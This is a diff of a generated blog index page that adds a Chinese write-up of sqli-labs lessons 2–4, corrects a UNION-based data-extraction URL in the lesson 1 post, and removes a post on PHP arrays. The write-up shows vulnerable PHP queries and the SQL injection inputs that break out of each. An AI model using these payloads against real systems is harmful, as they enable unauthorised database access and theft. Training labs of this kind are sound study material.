@@ -71,6 +71,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sqli-lab-less2-less4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/10/28/sqli-lab-less2-less4/" class="article-date">
+  <time class="dt-published" datetime="2022-10-28T08:21:46.000Z" itemprop="datePublished">2022-10-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/10/28/sqli-lab-less2-less4/">sqli-lab-less2-less4</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>第二关：<br>我们先按照上题一样输入<code>?id=1&#39; --+</code>和<code>?id=1&#39; and 1=1 --+</code>发现都报错，而直接输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1 --+</span><br></pre></td></tr></table></figure>
+<p>能正常输出。<br>我们查看原代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>发现和上题不一样<br>上题为id&#x3D;’$id’,而这题没有单引号。<br>如果输入<code>?id=1&#39; --+</code>时变为<code>id=1&#39;</code>就会报错。<br>知道这些后，就可以开始查询了，只需把上题的’删去即可，因为这题没有单引号，所以注释号–+可以不需要了。</p>
+<p><strong>注意查询顺序：</strong><br>先查行数，再查回显数，<br>然后再获得数据库database()的名字，接着通过数据库的名字后查询表名table_name，接着通过数据库名字后查询列名group_concat，最后通过表名和列名查询我们所要的资料。</p>
+<p>第三关：<br>看源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>可知我们应该输入<code>?id=1&#39;)--+</code></p>
+<p>第四关：<br>看源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>这里的.应该是连接符，这行代码应该可以看成<code>&quot;id&quot;</code>，<br>加上下面的括号，整个应该为（”id”)，<br>所以我们在此处应该输入<code>?id=1&quot;) --+</code></p>
+<p>其他查询方式和顺序和第一关几乎一样，就不再赘述了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/10/28/sqli-lab-less2-less4/" data-id="cl9sal7cj0000rg80evap8oyw" data-title="sqli-lab-less2-less4" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sqli-lab-less1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/10/26/sqli-lab-less1/" class="article-date">
@@ -134,7 +185,7 @@
 <p>7、获得数据表中每列的名称：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27表名%27)--+</span><br></pre></td></tr></table></figure>
 <p>8、我们就可以获得我们想要的信息了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,select group_concat(列名) from 数据库名.数据表名--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,(select%20group_concat(列名)%20from%20数据库名.数据表名)--+</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -467,49 +518,6 @@
 
 
   
-    <article id="post-PHP数组" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/10/23/PHP%E6%95%B0%E7%BB%84/" class="article-date">
-  <time class="dt-published" datetime="2022-10-23T08:33:07.000Z" itemprop="datePublished">2022-10-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/10/23/PHP%E6%95%B0%E7%BB%84/">PHP数组</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>***数组在之前已经简单提过，这里将更详细的介绍<br>1、是什么：数组是一个能在单个变量中存储多个值的特殊变量。</p>
-<p>2、	创建数组：array() 函数用于创建数组：array();<br>这里有两种创建数值数组的方法：<br>    &lt;1&gt;自动分配 ID 键（ID 键总是从 0 开始）：<br>    Eg<br>    $cars&#x3D;array(“Volvo”,”BMW”,”Toyota”);<br>    &lt;2&gt;人工分配 ID 键：<br>    Eg:<br>    $cars[0]&#x3D;”Volvo”;<br>    $cars[1]&#x3D;”BMW”;<br>    $cars[2]&#x3D;”Toyota”;</p>
-<p>3、获取数组的长度 - count() 函数<br>       Eg：<br>    $cars&#x3D;array(“Volvo”,”BMW”,”Toyota”);<br>    echo count($cars);<br>    运行的结果为：<br>    3</p>
-<p>4、遍历数值数组：遍历并打印数值数组中的所有值，可以使用 for 循环<br>    Eg：<br>    $cars&#x3D;array(“Volvo”,”BMW”,”Toyota”);<br>    $arrlength&#x3D;count($cars);<br>     for($x&#x3D;0;$x&lt;$arrlength;$x++)<br>    {<br>           echo $cars[$x];<br>           echo “<br>“;<br>    }<br>       运行的结果为：<br>    Volvo<br>    BMW<br>    Toyota</p>
-<p>5、PHP 关联数组：关联数组是使用您分配给数组的指定的键的数组。<br>       Eg：<br>       $age&#x3D;array(“Peter”&#x3D;&gt;”35”,”Ben”&#x3D;&gt;”37”,”Joe”&#x3D;&gt;”43”);<br>    or:<br>    $age[‘Peter’]&#x3D;”35”;<br>    $age[‘Ben’]&#x3D;”37”;<br>    $age[‘Joe’]&#x3D;”43”;<br>6、遍历关联数组：遍历并打印关联数组中的所有值，可以使用 foreach 循环<br>       Eg：<br>       $age&#x3D;array(“Peter”&#x3D;&gt;”35”,”Ben”&#x3D;&gt;”37”,”Joe”&#x3D;&gt;”43”);<br>       foreach($age as $x&#x3D;&gt;$x_value)<br>    {<br>             echo “Key&#x3D;” . $x . “, Value&#x3D;” . $x_value;<br>             echo “<br>“;<br>    }<br>    运行的结果为：<br>    Key&#x3D;Peter, Value&#x3D;35<br>    Key&#x3D;Ben, Value&#x3D;37<br>    Key&#x3D;Joe, Value&#x3D;43<br>Ps：foreach函数用法过几篇再说明<br>7、数组排序函数<br>    &lt;1&gt;sort() - 对数组进行升序排列<br>    &lt;2&gt;rsort() - 对数组进行降序排列<br>    &lt;3&gt;asort() - 根据关联数组的值，对数组进行升序排列<br>    &lt;4&gt;ksort() - 根据关联数组的键，对数组进行升序排列<br>    &lt;5&gt;arsort() - 根据关联数组的值，对数组进行降序排列<br>    &lt;6&gt;krsort() - 根据关联数组的键，对数组进行降序排列<br>    每个函数相差不大，简单拿&lt;1&gt;&lt;3&gt;举两个例子<br>    Eg1：<br>    $cars&#x3D;array(“Volvo”,”BMW”,”Toyota”);<br>    sort($cars);<br>    print_r($cars);<br>    运行的结果为：<br>    Array ( [0] &#x3D;&gt; BMW [1] &#x3D;&gt; Toyota [2] &#x3D;&gt; Volvo )<br>    Eg2:<br>    $age&#x3D;array(“Peter”&#x3D;&gt;”35”,”Ben”&#x3D;&gt;”37”,”Joe”&#x3D;&gt;”43”);<br>    asort($age);<br>    运行的结果为：<br>    Array ( [Peter] &#x3D;&gt; 35 [Ben] &#x3D;&gt; 37 [Joe] &#x3D;&gt; 43 )</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/10/23/PHP%E6%95%B0%E7%BB%84/" data-id="cl9p4yq7e0005lk80bltn2o9q" data-title="PHP数组" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -546,6 +554,10 @@
       <ul>
         
           <li>
+            <a href="/2022/10/28/sqli-lab-less2-less4/">sqli-lab-less2-less4</a>
+          </li>
+        
+          <li>
             <a href="/2022/10/26/sqli-lab-less1/">sqli-lab-less1</a>
           </li>
         
@@ -559,10 +571,6 @@
         
           <li>
             <a href="/2022/10/23/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">PHP基础学习小结</a>
-          </li>
-        
-          <li>
-            <a href="/2022/10/23/mysql%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/">mysql增删改查</a>
           </li>
         
       </ul>
